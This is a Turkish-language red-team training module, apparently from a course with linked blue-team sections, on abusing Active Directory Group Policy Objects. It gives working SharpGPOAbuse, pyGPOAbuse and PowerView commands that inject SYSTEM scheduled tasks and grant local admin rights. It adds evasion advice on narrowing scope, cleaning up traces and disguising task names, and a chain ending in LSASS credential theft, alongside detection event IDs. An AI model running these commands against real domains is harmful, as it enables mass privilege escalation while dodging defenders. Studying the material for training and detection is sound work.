## 1. Kavramsal Temel — Neden Var?

GPO (Group Policy Object) AD'nin **merkezi yapılandırma silahıdır**: tek bir GPO, bağlı olduğu OU/domain/site'taki **binlerce makinede** ayar, script ve görev uygular. Saldırgan için bu ölçek bir armağandır:

> **Bir GPO'yu düzenleyebiliyorsan (veya bir OU'ya kötücül GPO bağlayabiliyorsan), o kapsamdaki HER makinede/kullanıcıda kod çalıştırabilirsin. Domain'e bağlı 2000 iş istasyonuna uygulanan bir GPO'ya zamanlanmış görev enjekte etmek = 2000 makinede eşzamanlı SYSTEM. Bu, tekil ACL abuse'un aksine "ölçekli" yükseltmedir.**

GPO yetkisi çoğu kez yanlış devredilir: "Workstation ekibine kendi OU'larının GPO'larını düzenleme hakkı" gibi masum bir devir, o OU'da yerel admin bulunan bir saldırgana domain-geneli etki verebilir.

**Analoji:** GPO = bir binadaki tüm dairelere aynı anda uygulanan yönetim kararı ("tüm kapılara şu kilidi tak"). Kararı yazabilen kişi, tek hamlede tüm daireleri etkiler.

## 2. Teknik Derinlik — GPO Yapısı ve Enjeksiyon Noktaları

### 2.1 GPO'nun iki parçası: GPC + GPT

```
   GPC (Group Policy Container)  → AD'de: CN=Policies,CN=System,DC=corp...
        gPCFileSysPath ──────────┐   (versiyon, uzantı listesi, bağ bilgisi)
   GPT (Group Policy Template)   ▼
        SYSVOL: \\corp.local\SYSVOL\corp.local\Policies\{GUID}\
        ├── Machine\  (bilgisayar ayarları — SYSTEM olarak uygulanır!)
        └── User\     (kullanıcı ayarları)
```

Kötücül değişiklik hem GPC'de (uzantı adları/versiyon) hem GPT'de (SYSVOL dosyaları) yapılır → SharpGPOAbuse ikisini birlikte günceller.

### 2.2 Hangi ayar → kod yürütme?

```
   Immediate Scheduled Task (Machine)  → makine açılınca/hemen SYSTEM olarak çalışır  ★ en yaygın
   Startup/Shutdown Script             → SYSTEM, önyükleme/kapanışta
   Logon/Logoff Script (User)          → kullanıcı bağlamında
   GPP (Group Policy Preferences)      → yerel admin ekle, servis, dosya kopyala
   User Rights Assignment              → "SeDebugPrivilege" ekle → dolaylı yükseltme
```

> **Immediate Task neden tercih edilir?** Zamanlanmış görevin "immediate" (bir kez, hemen) türü, GPO yenilenince (`gpupdate` veya ~90 dk periyot) **SYSTEM** olarak tetiklenir ve iş bitince silinir → hem hızlı hem görece sessiz. Startup script yeniden başlatma gerektirir (yavaş).

### 2.4 gPCMachineExtensionNames — sessiz ama kritik iz

GPO'ya yeni bir istemci-tarafı uzantı (CSE) eklediğinde (ör. Scheduled Tasks CSE), GPC'deki `gPCMachineExtensionNames` özniteliği **CSE GUID'leri** ile güncellenir. İstemci bu listeye bakıp hangi uzantıları işleyeceğine karar verir.

```
   Boş GPO'ya Immediate Task eklersen:
   gPCMachineExtensionNames  →  [{CSE-GUID Scheduled Tasks}{Tool-Extension-GUID}]
   → Bu değişim 5136'da görünür; savunmacı "hangi GPO'ya ne tür ayar eklendi"yi buradan anlar.
   versionNumber de artar → istemciler değişikliği fark eder ve uygular.
```

Yani sadece SYSVOL dosyası değil, **GPC özniteliği** de değişir; ikisi birlikte GPO değişikliğinin çift-imzasıdır.

### 2.3 Kapsam ve gecikme gerçeği

GPO değişikliği anında uygulanmaz: istemciler GPO'yu **~90 dakikada bir (±30 rastgele)** veya `gpupdate /force` ile çeker. Bir kullanıcıyı `gpupdate` çalıştırmaya ikna edemezsin, ama sabırlı beklersen kapsamdaki makineler sırayla kod'u çalıştırır.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 SharpGPOAbuse (Windows, en yaygın)

```
:: Kontrol ettiğim bir GPO'ya SYSTEM olarak çalışan Immediate Task ekle
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
   --Author CORP\admin --Command "cmd.exe" \
   --Arguments "/c net localgroup administrators corp\jdoe /add" \
   --GPOName "Workstation-Policy"

:: Kullanıcı bağlamı için logon script
SharpGPOAbuse.exe --AddUserScript --ScriptName evil.bat --ScriptContents "..." --GPOName "..."
```

### 3.2 pyGPOAbuse (Linux)

```bash
# GPO GUID ile immediate task ekle (uzaktan, Linux'tan)
pygpoabuse.py corp.local/jdoe:'Welcome1' -gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}" \
  -command 'net localgroup administrators corp\jdoe /add' -dc-ip 10.10.10.5
```

### 3.3 GPP ile yerel admin ekleme (alternatif yük)

```
:: SharpGPOAbuse ile hedef kullanıcıyı GPO kapsamındaki makinelerin yerel admin grubuna ekle
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jdoe --GPOName "Workstation-Policy"
::  → GPP "Restricted Groups" / Local Users&Groups ile kapsamdaki her makinede jdoe = yerel admin
```

### 3.4 User Rights Assignment ile dolaylı yükseltme

```
:: GPO ile "SeDebugPrivilege" veya "SeImpersonatePrivilege" ekle (User Rights Assignment)
:: → kapsamdaki makinelerde hedef hesaba LSASS okuma/token taklidi yeteneği kazandır
:: (GptTmpl.inf içinde SeDebugPrivilege = *S-1-5-21-...-jdoe)
```

### 3.5 GPO'ya erişim/hak keşfi (önce doğrula)

```powershell
# Hangi GPO'lar üzerinde yazma hakkım var? (BloodHound GPLink/WriteGPO kenarları da gösterir)
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'WriteProperty|GenericWrite|GenericAll' -and
      $_.SecurityIdentifier -eq (Get-DomainUser jdoe).objectsid }
# Hedef GPO hangi OU'lara bağlı = kapsam
Get-DomainOU | ? { $_.gplink -match '{GUID}' } | Select name
```

**Örnek çıktı:**
```
[+] Immediate Task 'Update' added to GPO Workstation-Policy
[+] GPT.INI version incremented → istemciler ~90 dk içinde uygulayacak
# → kapsam: OU=Workstations (438 makine) → hepsinde SYSTEM
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| GPO değiştirme | **T1484.001** (Group Policy Modification) | **5136** GPC değişti; SYSVOL `ScheduledTasks.xml`/`GptTmpl.inf` yazımı; gPCMachineExtensionNames değişti | [Blue 05.3](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.3_GPO_Guvenligi_ve_Yetki_Devri_Hijyeni.md) |
| Immediate Task yürütme | T1053.005 | İstemcide **4698** (görev oluşturuldu) + 4688 SYSTEM | [Blue 04.3](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.3_Uzak_Yurutme_Izleri.md) |
| SYSVOL dosya değişikliği | T1484.001 | SYSVOL replikasyonu (DFS-R); dosya oluşturma zaman damgası | [Blue 05.3](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.3_GPO_Guvenligi_ve_Yetki_Devri_Hijyeni.md) |

**OPSEC notları:**
- **Ölçek = tespit.** 438 makinede eşzamanlı 4698/4688 SYSTEM görevi, herhangi bir SIEM'de anında öne çıkar. Kapsamı **daralt**: mümkünse hedef OU'nun altında **tek bir makineyi** kapsayan bir GPO/güvenlik filtresi kullan, tüm iş istasyonlarını tetikleme.
- **Immediate Task'ı iş bitince temizle** — SharpGPOAbuse görevi ekler; çalıştıktan sonra GPO'dan kaldır ki kalıcı IOC (SYSVOL'de `ScheduledTasks.xml`) bırakma. Aksi hâlde her yeni makine de tetiklenir → gürültü büyür.
- **SYSVOL yazımı DFS-R ile tüm DC'lere replike olur** ve zaman damgası bırakır ([Blue 05.3](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.3_GPO_Guvenligi_ve_Yetki_Devri_Hijyeni.md)); bu, adli analizde net bir "ne zaman değiştirildi" verisidir.
- **Author/TaskName alanlarını meşru göster** — `--Author CORP\Administrator`, `--TaskName "Windows Update"` gibi değerler gözle taramada dikkat çekmez.
- Yüksek-değerli hedef: **Default Domain Policy / Default Domain Controllers Policy** üzerinde yazma hakkı = domain/DC geneli etki, ama en çok izlenen GPO'lardır ([Blue 05.3](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.3_GPO_Guvenligi_ve_Yetki_Devri_Hijyeni.md)). Dikkatli ol.

### Gerçek-dünya GPO zinciri (hedefli, düşük-iz)

```
   1) BloodHound: jdoe → "Helpdesk-GPO" üzerinde WriteProperty; GPO → OU=Servers'a bağlı
   2) OU=Servers'ta güvenlik filtresi ile SADECE JUMP01'i kapsayan geçici hedefleme
   3) pyGPOAbuse: JUMP01'de SYSTEM olarak çalışan Immediate Task ekle
   4) ~90 dk (veya JUMP01 reboot/gpupdate) → JUMP01'de SYSTEM shell
   5) JUMP01 Tier 1 jump host → admin oturumları LSASS'ta → Modül 03
   6) Task'ı GPO'dan kaldır (temizlik). Tüm OU yerine tek makine → 438 değil 1 olay.
```

### Ek: DC'lere karşı GPO (Tier 0 etkisi)

`Default Domain Controllers Policy` veya DC OU'suna bağlı bir GPO üzerinde yazma = **tüm DC'lerde SYSTEM** → doğrudan domain hakimiyeti. Ama bu GPO'lar en yoğun izlenenlerdir; SACL denetimi ve değişiklik-uyarısı ([Blue 05.3](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.3_GPO_Guvenligi_ve_Yetki_Devri_Hijyeni.md)) neredeyse kesindir. Yüksek ödül, yüksek risk.
